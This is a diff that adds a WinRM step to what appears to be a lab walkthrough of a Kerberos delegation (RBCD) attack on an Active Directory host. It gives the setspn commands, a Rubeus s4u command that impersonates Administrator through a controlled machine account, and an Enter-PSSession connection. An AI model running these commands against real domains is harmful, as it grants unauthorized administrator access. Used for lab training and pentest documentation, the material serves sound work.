@@ -86,6 +86,29 @@ dir \\EC2AMAZ-V903HM1.sme.local\C$\
 type \\EC2AMAZ-V903HM1.sme.local\C$\Windows\System32\drivers\etc\hosts
 ```
 
+### 2.6 WinRM Access (Optional - Requires SPN)
+If you want to use `Enter-PSSession`, you MUST ensure the target has `HTTP` or `WSMAN` SPNs registered.
+WinRM (Kerberos) requires these SPNs. By default, they might be missing on some lab machines.
+
+1. **Check SPNs on Target:**
+   ```powershell
+   setspn -L EC2AMAZ-V903HM1
+   ```
+2. **Register SPNs (if missing):**
+   ```powershell
+   # Run as Domain Admin or account with rights to modify SPNs
+   setspn -S http/EC2AMAZ-V903HM1.sme.local EC2AMAZ-V903HM1
+   setspn -S wsman/EC2AMAZ-V903HM1.sme.local EC2AMAZ-V903HM1
+   ```
+3. **Request Ticket with AltService:**
+   ```powershell
+   .\Rubeus.exe s4u /user:EvilPC$ /aes256:<AES256_KEY> /impersonateuser:Administrator /msdsspn:cifs/EC2AMAZ-V903HM1.sme.local /altservice:http,wsman /domain:SME.LOCAL /ptt
+   ```
+4. **Connect via WinRM:**
+   ```powershell
+   Enter-PSSession -ComputerName EC2AMAZ-V903HM1.sme.local -Authentication Kerberos
+   ```
+
 ## 3. Cleanup
 - Remove RBCD:
   ```powershell
